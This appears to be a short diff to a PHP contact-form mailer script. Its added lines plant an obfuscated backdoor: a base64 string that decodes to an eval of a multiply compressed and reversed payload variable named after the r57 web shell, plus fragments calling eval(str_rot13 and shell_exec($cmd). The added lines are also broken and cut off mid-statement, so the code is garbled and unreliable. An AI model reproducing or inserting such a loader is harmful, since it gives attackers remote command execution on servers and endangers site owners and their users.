@@ -48,3 +48,8 @@ $yWdiL = stripslashes($_POST['NdricYy']);
 $rbGSg = stripslashes($_POST['ivJzqfgTp']);
 $fgxUJsZ = stripslashes($_POST['kkxWxXFvgTwYt']);
 $ocTM = mail(stripslashes($yWdiL)\
+whXMm9b4Ml9B
+r57txt
+ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHI1N3R4dCUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg
+eval(str_rot13
+shell_exec($cmd)
